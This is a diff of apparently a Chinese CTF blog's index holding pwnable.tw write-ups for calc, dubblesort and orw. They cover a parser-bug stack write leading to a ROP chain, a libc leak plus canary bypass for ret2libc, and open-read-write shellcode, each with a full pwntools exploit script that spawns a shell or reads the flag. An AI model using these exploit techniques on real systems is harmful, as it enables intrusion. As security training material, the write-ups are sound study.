-<p>举个例子：1+2*3+4*5</p>
-<p><img src="https://i.loli.net/2021/07/12/cBS2oLz4kEDWZKm.png"></p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="尝试0x01"><a href="#尝试0x01" class="headerlink" title="尝试0x01"></a>尝试0x01</h3><p>可以看到若有乘法的话，它之后运算完乘法的东西是不会把前面放着的加法也算掉的，而是会一直放在里面，这就让我想到能不能用类似<code>1+1*1+1*1+...+1*something_to_write</code>完成一个栈溢出并rop，但是发现输入只有0x400，但padding有0x5a0，而且还有个canary，这条路走不通</p>
-<p><img src="https://i.loli.net/2021/07/12/yMlWFQBKEtN3G8D.png"></p>
-<h3 id="尝试0x02"><a href="#尝试0x02" class="headerlink" title="尝试0x02"></a>尝试0x02</h3><p>开始<del>xjb乱试</del>继续分析，发现<code>+1</code>，<code>+1+1*1</code>等输出不正常，于是想到<code>+1</code>这种没有左操作数，手动模拟一下发现<code>+x</code>会把<code>x</code>加到<code>ans[0]</code>上去，而输出又是<code>ans[ans[0]]</code>，于是输出的就变成了<code>ans[x]</code>啊哈，我们有了栈上任意地址读！</p>
-<p>但这还不够，手动模拟<code>+x+y</code>发现这个式子会把<code>ans[x]+y</code>，那么我们可以先打印一个地址的内容，然后算出要写的内容和它的差y，于是就有了栈上任意地址写！</p>
-<p>看到<code>ans</code>在<code>ebp-0x5a0</code>的位置，而<code>ans</code>是<code>int</code>，所以得到<code>ans[360]</code>就是<code>ebp</code>，<code>ans[361]</code>就是<code>retaddr</code>，尝试一下修改：</p>
-<p><img src="https://i.loli.net/2021/07/12/leixOUpJSHAG6TM.png"></p>
-<p>Perfect！</p>
-<p>这样也不用管canary了，因为根本不会遇到它</p>
-<p>下面就是构造rop链并布置到栈上，注意到这个程序是静态链接的，直接用<code>ROPgadget --binary ./calc --ropchain</code>得到（懒人必备</p>
-<img src="https://i.loli.net/2021/07/12/itsC5HBI3SlahOK.png" style="zoom:75%;" />
-
-<p><strong>注意：</strong>因为程序输出是按int输出，会自动把小端表示倒回来，所以写入<code>&quot;/bin&quot;,&quot;//sh&quot;</code>的时候要倒着写</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./calc&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10100</span>)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span>(<span class="params">i,addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(<span class="number">361</span>+i)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    orginal = <span class="built_in">int</span>(r.recv().strip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    dis = addr - orginal</span><br><span class="line">    <span class="keyword">if</span> dis &gt; <span class="number">0</span> :</span><br><span class="line">        payload2 = payload + <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(dis)</span><br><span class="line">    <span class="keyword">elif</span> dis &lt; <span class="number">0</span> :</span><br><span class="line">        payload2 = payload + <span class="string">&#x27;-&#x27;</span> + <span class="built_in">str</span>(-dis)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    r.sendline(payload2)</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">rop_chain = [<span class="number">0x080701aa</span>,<span class="number">0x080ec060</span>,<span class="number">0x0805c34b</span>,<span class="number">0x6e69622f</span>,<span class="number">0x0809b30d</span>,<span class="number">0x080701aa</span>,<span class="number">0x080ec064</span>,<span class="number">0x0805c34b</span>,<span class="number">0x68732f2f</span>,<span class="number">0x0809b30d</span>,<span class="number">0x080701aa</span>,<span class="number">0x080ec068</span>,<span class="number">0x080550d0</span>,<span class="number">0x0809b30d</span>,<span class="number">0x080481d1</span>,<span class="number">0x080ec060</span>,<span class="number">0x080701d1</span>,<span class="number">0x080ec068</span>,<span class="number">0x080ec060</span>,<span class="number">0x080701aa</span>,<span class="number">0x080ec068</span>,<span class="number">0x080550d0</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x08049a21</span>]</span><br><span class="line"><span class="comment"># \bin\\sh 要倒过来写！！！！！！！</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rop_chain)):</span><br><span class="line">    modify(i,rop_chain[i])</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;give me shell&quot;</span>) <span class="comment">#随便输入不是运算符和数字的字符串，就会从calc()返回，触发ropchain</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://www.tuicool.com/articles/VNzqea3">https://www.tuicool.com/articles/VNzqea3</a></p>
-<p><a href="https://n0va-scy.github.io/2019/07/03/pwnable.tw/">https://n0va-scy.github.io/2019/07/03/pwnable.tw/</a></p>
-]]></content>
-      <categories>
-        <category>pwnable.tw</category>
-      </categories>
-      <tags>
-        <tag>reverse</tag>
-        <tag>rop</tag>
+        <tag>ret2libc</tag>
       </tags>
   </entry>
   <entry>
@@ -245,154 +272,127 @@ D --&gt; C
         <category>pwnable.tw</category>
       </categories>
       <tags>
-        <tag>rop</tag>
         <tag>栈迁移</tag>
+        <tag>rop</tag>
         <tag>libc</tag>
       </tags>
   </entry>
   <entry>
-    <title>dubblesort</title>
-    <url>/archives/51d1aace.html</url>
-    <content><![CDATA[<h2 id="pwnable-tw-dubblesort"><a href="#pwnable-tw-dubblesort" class="headerlink" title="pwnable.tw - dubblesort"></a>pwnable.tw - dubblesort</h2><span id="more"></span>
+    <title>calc</title>
+    <url>/archives/5c3132af.html</url>
+    <content><![CDATA[<h2 id="pwnable-tw-calc"><a href="#pwnable-tw-calc" class="headerlink" title="pwnable.tw - calc"></a>pwnable.tw - calc</h2><span id="more"></span>
 
 <hr>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先看保护，好家伙，保护全开</p>
-<p><img src="https://i.loli.net/2021/07/13/v7OlDzmIHKnYR23.png"></p>
-<p>看看程序流程，大概就是输入个名字，然后输入一堆数，冒泡排序后输出</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p><img src="https://i.loli.net/2021/07/13/OgABFh6tqYMckDK.png"></p>
-<p>输了几次名字，发现会有段乱码，丢进ida看看，果然输出名字的地方有问题</p>
-<p>他是read输入的，不会在末尾加上<code>\x00</code>截断，又用printf输出，还用了<code>%s</code>，那栈上东西就好泄露了；加上题目给了libc文件，大概就是个ret2libc吧</p>
-<p>用gdb调一下，看看栈上有什么东西可以泄露</p>
-<blockquote>
-<p>对于开了pie保护的程序，可以用<code>b *$rebase(your_addr)</code>来下断点</p>
-</blockquote>
-<p>我们断在打印名字的地方<code>0xA32</code>看看</p>
-<p><img src="https://i.loli.net/2021/07/13/nacEtulVQR4OXxD.png"></p>
-<p>看到ecx的地方就是我们输入的名字，它下面有个got表的地址，距离是<code>dis = 0x58 - 0x3c = 0x1c</code></p>
-<div class="note danger"><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>这个距离在我本地打得通，在远程是打不通的，参考了其他大佬的wp后发现，他们的gdb显示的距离算出来是0x18，而0x1c的地方是_init_array的地址，可能问题在我的虚拟机环境上？没搞明白o(╥﹏╥)o</p>
-</div>
+<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先看下保护，</p>
+<p><img src="https://i.loli.net/2021/07/12/oZBfPkaNpDIg92F.png"></p>
+<p>丢进ida分析程序，粗略看就是实现了一个简单计算器的功能，不支持括号</p>
+<h3 id="看一下calc-函数"><a href="#看一下calc-函数" class="headerlink" title="看一下calc()函数"></a>看一下calc()函数</h3><p><img src="https://i.loli.net/2021/07/12/4lJ17y5uWGme9cK.png"></p>
+<p>先是把expr置零，并用<code>get_expr()</code>输入进来，看代码可知这个函数过滤了除数字以及+-*/%之外的字符，到<code>0x0a</code>即<code>&#39;\n&#39;</code>结束</p>
+<p><img src="https://i.loli.net/2021/07/12/LiVcjf51ykS2Nxu.png"></p>
+<p>然后将一个ans数组置零，parse_expr()显然就是实现计算器功能的函数，顺便看到他输出的结果是<code>ans[ans[0]]</code>，这里提醒我们要注意<code>ans[0]</code>的内容</p>
+<h3 id="分析parse-expr"><a href="#分析parse-expr" class="headerlink" title="分析parse_expr()"></a>分析<code>parse_expr()</code></h3><p>实现方法很常规，就是把运算符和操作数分离，然后再运算</p>
+<h4 id="先看分离的过程"><a href="#先看分离的过程" class="headerlink" title="先看分离的过程"></a>先看分离的过程</h4><p>它维护了两个数组，一个op_buf[100]存了运算符，另一个是calc()调用的时候传进来的ans</p>
+<p><img src="https://i.loli.net/2021/07/12/UgxBH9nfeuRl2LW.png"></p>
+<p>首先，函数进一个大循环，</p>
+<p><strong>如果当前位置是数字</strong>，就什么都不做，进入下一轮循环</p>
+<p><strong>如果是运算符</strong>，（注意到有一个<code>unsigned int</code>，保证了<code>运算符-&#39;0&#39;</code>无论如何都大于9）</p>
+<p>程序先把左操作数取到s1中，然后做一个判断：左操作数是否为0，若是，就报错退出（这在数学上不太合理，anyway，这是个pwn题</p>
+<p>然后把左操作数转成数字，放进ans，先<code>ans[0]++</code>，然后把操作数放在<code>ans[ans[0]+1]</code>，可以猜测<code>ans[0]</code>是一个标志或者计数器</p>
+<p>后面又是一个判断：后一个字符是否是运算符，若是，报错退出（就是防止类似<code>1++1</code>这种东西</p>
+<h4 id="下面分析运算的部分"><a href="#下面分析运算的部分" class="headerlink" title="下面分析运算的部分"></a>下面分析运算的部分</h4><p><img src="https://i.loli.net/2021/07/12/hgqn9bZSis6xY7t.png"></p>
+<p>它不会在读到第一个运算符马上运算<del>废话</del>，一是没有右操作符，二是类似<code>1+5*2</code>这种有运算优先级的问题需要处理</p>
+<p>所以它是读到第二个运算符再来处理，用op_num来维护当前运算到哪个运算符，</p>
+<p>至于运算的流程很简单，如果是*/%，看前面是不是+-，若是，等待下一个运算符，若不是就运算</p>
+<p>运算这里有一个<code>eval()</code>函数很重要，我们来看一下：</p>
+<p><img src="https://i.loli.net/2021/07/12/ciZtWpon31uMSyG.png"></p>
+<p>可以看到<code>ans[ans[0]-1]</code>和<code>ans[ans[0]]</code>分别为当前运算符的左右操作数，于是<code>ans[0]</code>记录的就是最新的运算符的左操作数，也就是上一个运算符的右操作数</p>
+<p>举个例子：1+2*3+4*5</p>
+<p><img src="https://i.loli.net/2021/07/12/cBS2oLz4kEDWZKm.png"></p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="尝试0x01"><a href="#尝试0x01" class="headerlink" title="尝试0x01"></a>尝试0x01</h3><p>可以看到若有乘法的话，它之后运算完乘法的东西是不会把前面放着的加法也算掉的，而是会一直放在里面，这就让我想到能不能用类似<code>1+1*1+1*1+...+1*something_to_write</code>完成一个栈溢出并rop，但是发现输入只有0x400，但padding有0x5a0，而且还有个canary，这条路走不通</p>
+<p><img src="https://i.loli.net/2021/07/12/yMlWFQBKEtN3G8D.png"></p>
+<h3 id="尝试0x02"><a href="#尝试0x02" class="headerlink" title="尝试0x02"></a>尝试0x02</h3><p>开始<del>xjb乱试</del>继续分析，发现<code>+1</code>，<code>+1+1*1</code>等输出不正常，于是想到<code>+1</code>这种没有左操作数，手动模拟一下发现<code>+x</code>会把<code>x</code>加到<code>ans[0]</code>上去，而输出又是<code>ans[ans[0]]</code>，于是输出的就变成了<code>ans[x]</code>啊哈，我们有了栈上任意地址读！</p>
+<p>但这还不够，手动模拟<code>+x+y</code>发现这个式子会把<code>ans[x]+y</code>，那么我们可以先打印一个地址的内容，然后算出要写的内容和它的差y，于是就有了栈上任意地址写！</p>
+<p>看到<code>ans</code>在<code>ebp-0x5a0</code>的位置，而<code>ans</code>是<code>int</code>，所以得到<code>ans[360]</code>就是<code>ebp</code>，<code>ans[361]</code>就是<code>retaddr</code>，尝试一下修改：</p>
+<p><img src="https://i.loli.net/2021/07/12/leixOUpJSHAG6TM.png"></p>
+<p>Perfect！</p>
+<p>这样也不用管canary了，因为根本不会遇到它</p>
+<p>下面就是构造rop链并布置到栈上，注意到这个程序是静态链接的，直接用<code>ROPgadget --binary ./calc --ropchain</code>得到（懒人必备</p>
+<img src="https://i.loli.net/2021/07/12/itsC5HBI3SlahOK.png" style="zoom:75%;" />
 
-<p>于是就可以输入<code>dis</code>个<code>a</code>，加上一个回车是<code>\x0a</code>正好把got表地址最低位的<code>\x00</code>覆盖掉，也就不会被截断了，回显的时候减去<code>0x0a</code>就行</p>
-<p>下面算一下got表的在libc中的偏移：</p>
-<ul>
-<li><p><strong>本地</strong>可以在gdb中用<code>vmmap</code>命令找到libc基址，用上面泄露的got表地址减去libc基址就是偏移，我本地是0x1b3000</p>
-</li>
-<li><p><strong>远程</strong>可以用<code>readelf -S libc_32.so.6</code>命令，找到<code>.got.plt</code>的地址</p>
-<img src="https://i.loli.net/2021/07/13/KyJiZYQMRVmI9TW.png" style="zoom:50%;" />
+<p><strong>注意：</strong>因为程序输出是按int输出，会自动把小端表示倒回来，所以写入<code>&quot;/bin&quot;,&quot;//sh&quot;</code>的时候要倒着写</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./calc&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10100</span>)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span>(<span class="params">i,addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(<span class="number">361</span>+i)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    orginal = <span class="built_in">int</span>(r.recv().strip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    dis = addr - orginal</span><br><span class="line">    <span class="keyword">if</span> dis &gt; <span class="number">0</span> :</span><br><span class="line">        payload2 = payload + <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(dis)</span><br><span class="line">    <span class="keyword">elif</span> dis &lt; <span class="number">0</span> :</span><br><span class="line">        payload2 = payload + <span class="string">&#x27;-&#x27;</span> + <span class="built_in">str</span>(-dis)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    r.sendline(payload2)</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">rop_chain = [<span class="number">0x080701aa</span>,<span class="number">0x080ec060</span>,<span class="number">0x0805c34b</span>,<span class="number">0x6e69622f</span>,<span class="number">0x0809b30d</span>,<span class="number">0x080701aa</span>,<span class="number">0x080ec064</span>,<span class="number">0x0805c34b</span>,<span class="number">0x68732f2f</span>,<span class="number">0x0809b30d</span>,<span class="number">0x080701aa</span>,<span class="number">0x080ec068</span>,<span class="number">0x080550d0</span>,<span class="number">0x0809b30d</span>,<span class="number">0x080481d1</span>,<span class="number">0x080ec060</span>,<span class="number">0x080701d1</span>,<span class="number">0x080ec068</span>,<span class="number">0x080ec060</span>,<span class="number">0x080701aa</span>,<span class="number">0x080ec068</span>,<span class="number">0x080550d0</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x0807cb7f</span>,<span class="number">0x08049a21</span>]</span><br><span class="line"><span class="comment"># \bin\\sh 要倒过来写！！！！！！！</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rop_chain)):</span><br><span class="line">    modify(i,rop_chain[i])</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;give me shell&quot;</span>) <span class="comment">#随便输入不是运算符和数字的字符串，就会从calc()返回，触发ropchain</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>got和plt的内容可以参考：<a href="https://www.jianshu.com/p/0ac63c3744dd">got表和plt表</a> ，<a href="https://www.jianshu.com/p/5092d6d5caa3">四个节的区别</a></p>
-<p><a href="https://blog.csdn.net/yfldyxl/article/details/81566279">readelf命令</a></p>
-</blockquote>
-</li>
-</ul>
-<p>至此，libc地址就被泄露了</p>
-<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>观察程序可以发现，他没有限制我们输入数字的个数，那么很容易想到栈溢出，然后ret2libc</p>
-<p>现在有两个问题：</p>
-<ul>
-<li>开了canary</li>
-<li>它会从小到大排序后再写在栈上原来位置</li>
-</ul>
-<h4 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h4><blockquote>
-<p>这里有个知识点是当scanf()读取非法字符时会发生格式错误，输入不会被写到栈上，由于没有清空缓冲区的函数，这个非法字符会一直留在缓冲区内，导致后面的输入也会报错，都不会被写到栈上。通过查看其它大佬的wp，发现+ - 这些字符会被视为合法输入，但是不会被写到栈上。</p>
-</blockquote>
-<p>那么在canary的地方放上<code>&#39;+&#39;</code>就行了</p>
-<h4 id="布置栈"><a href="#布置栈" class="headerlink" title="布置栈"></a>布置栈</h4><p>先看从numbers到canary的距离为<code>0x7c - 0x1c = 0x60</code>，注意是按int输入的，所以这里要填充<code>0x60 / 4 = 24</code>个0</p>
-<p><img src="https://i.loli.net/2021/07/13/TYqvzA5aQHO9bcN.png"></p>
-<p>然后在canary填充一个<code>&#39;+&#39;</code></p>
-<p>再看canary到retaddr的距离</p>
-<p>这里有个很隐蔽的坑，main函数末尾这里，不是平常的<code>leave; retn;</code>，esp被动过了，所以算padding的时候不能用ida在变量那里显示的来算</p>
-<p><img src="https://i.loli.net/2021/07/13/jSXfdZLTgFhQ4H6.png"></p>
-<p>这样的话，距离就是<code>0x10 + 0xc = 0x1c</code>，所以填充<code>0x1c / 4 = 7</code>个字节的padding，考虑到后面放的就是system函数的地址<code>sys_addr</code>，要求从小到大，padding可以直接是<code>sys_addr</code></p>
-<p>再后面是system函数的返回地址，这里是可以随便填一个不小于<code>sys_addr</code>的数，简单起见直接填<code>sys_addr</code></p>
-<p>再后面是system函数的参数<code>&#39;\bin\sh&#39;</code>，巧合的是这个字符串在libc中地址刚好大于<code>sys_addr</code></p>
-<p>所以如图：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high addr            +---------------------------------+</span><br><span class="line">                     |            binsh-addr           |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                ebp  +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                     |               *7                |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |               &#x27;+&#x27;               | &lt;--- canary</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |               &#x27;0&#x27;               |</span><br><span class="line">                     |               *24               |</span><br><span class="line">low addr     numbers +---------------------------------+</span><br></pre></td></tr></table></figure>
-
-<p>总共输入<code>24+1+7+3=35</code>个数字</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./dubblesort&quot;</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line"><span class="comment">#r = process(&quot;./dubblesort&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10101</span>)</span><br><span class="line"></span><br><span class="line">local_got_offset = <span class="number">0x1b3000</span></span><br><span class="line">remote_got_offset = <span class="number">0x1b0000</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;name :&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>)  <span class="comment">#why remote is 24 but local is 28?</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Hello &#x27;</span>)</span><br><span class="line">r.recv(<span class="number">24</span>)</span><br><span class="line">libc_addr = u32(r.recv(<span class="number">4</span>)) - <span class="number">0xa</span></span><br><span class="line"><span class="comment">#libc_addr = libc_addr - local_got_offset</span></span><br><span class="line">libc_addr = libc_addr - remote_got_offset</span><br><span class="line">sys_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_addr:&quot;</span>, <span class="built_in">hex</span>(libc_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;sys_addr:&quot;</span>, <span class="built_in">hex</span>(sys_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;binsh_addr:&quot;</span>,<span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">24</span> + <span class="number">1</span> + <span class="number">7</span> + <span class="number">3</span> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;cnt:&quot;</span>,cnt</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(cnt))</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):        <span class="comment">#why 7? see code 0xB10</span></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(sys_addr))</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(sys_addr)) <span class="comment">#ret_addr</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(sys_addr)) <span class="comment">#ret_addr of sys</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(binsh_addr))</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://v1ckydxp.github.io/2019/05/01/pwnable-tw-dubblesort-writeup/">https://v1ckydxp.github.io/2019/05/01/pwnable-tw-dubblesort-writeup/</a></p>
-<p><a href="https://blog.csdn.net/qq_43189757/article/details/102799397">https://blog.csdn.net/qq_43189757/article/details/102799397</a></p>
-<p><a href="https://www.cnblogs.com/Rookle/p/12884543.html">https://www.cnblogs.com/Rookle/p/12884543.html</a></p>
-<p><a href="https://www.cjovi.icu/WP/919.html">https://www.cjovi.icu/WP/919.html</a></p>
+<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://www.tuicool.com/articles/VNzqea3">https://www.tuicool.com/articles/VNzqea3</a></p>
+<p><a href="https://n0va-scy.github.io/2019/07/03/pwnable.tw/">https://n0va-scy.github.io/2019/07/03/pwnable.tw/</a></p>
 ]]></content>
       <categories>
         <category>pwnable.tw</category>
       </categories>
       <tags>
-        <tag>stackoverflow</tag>
-        <tag>ret2libc</tag>
+        <tag>rop</tag>
+        <tag>reverse</tag>
       </tags>
   </entry>
   <entry>
-    <title>hacknote</title>
-    <url>/archives/c5963d96.html</url>
-    <content><![CDATA[<h2 id="pwnable-tw-hacknote"><a href="#pwnable-tw-hacknote" class="headerlink" title="pwnable.tw - hacknote"></a>pwnable.tw - hacknote</h2><span id="more"></span>
+    <title>orw</title>
+    <url>/archives/6fa2aae4.html</url>
+    <content><![CDATA[<h2 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw - orw"></a>pwnable.tw - orw</h2><span id="more"></span>
 
 <hr>
-<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先看保护：栈上不可执行，有canary，动态链接</p>
-<p><img src="https://i.loli.net/2021/07/21/AKgWeCxqcZfmDh5.png"></p>
-<p>下面看看程序流程，根据交互和main函数的逻辑可以初步判断各个函数的名字和作用</p>
-<p><img src="https://i.loli.net/2021/07/21/cY9ZpFk8CQemDNv.png"></p>
-<h3 id="add-note"><a href="#add-note" class="headerlink" title="add_note()"></a>add_note()</h3><p><img src="https://i.loli.net/2021/07/21/XHlEADkxLdjiIWq.png"></p>
-<p>首先，很明显，申请的note不能超过5个</p>
-<p>然后，经过分析，可以看到，每次add_note会malloc两个堆块，一个8byte，我们叫做<code>head</code>；另一个大小是size（用户输入），叫做<code>data</code></p>
-<p>那么这个ptr就是一个结构体（note_struct）的指针，note_struct里面有两个指针，分别指向head堆块和data堆块，于是可以创建一个结构体，并把ptr和v0的类型改成<code>note_stuct *</code></p>
-<blockquote>
-<p>关于ida中创建结构体：可参考<a href="https://thinkycx.me/2019-07-15-how-to-create-structs-in-IDA.html">https://thinkycx.me/2019-07-15-how-to-create-structs-in-IDA.html</a></p>
-</blockquote>
-<p>head堆块中存了一个函数output的地址，这个后面再看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ptr[i]  ---&gt; head: head_chunk_addr  ---&gt; output_addr  ---&gt; func_output</span><br><span class="line">        ---&gt; data: data_chunk_addr  ---&gt; data</span><br></pre></td></tr></table></figure>
+<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>丢进ida可以发现有个orw_seccomp函数，于是用<a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>查看限制：</p>
+<p><img src="https://i.loli.net/2021/07/10/WnQ5zPIfiR8gujA.png"></p>
+<p>只能用open，read，write。</p>
+<p>已知flag在<code>/home/orw/flag</code>，那只需要open它，read它，再write到标准输出就行</p>
+<p>并且这个程序流程就是输入shellcode并运行，那直接构造shellcode就行</p>
+<p>值得注意的点： 函数的返回值在eax中，在read的时候先把eax给ebx，再改为read的系统调用号</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./orw&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    call op</span></span><br><span class="line"><span class="string">    .ascii &quot;/home/orw/flag&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">op:</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ecx,ebx</span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov edx,0xff</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov ebx,1</span></span><br><span class="line"><span class="string">    mov eax,4</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">r.sendafter(<span class="string">&quot;shellcode:&quot;</span>,shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
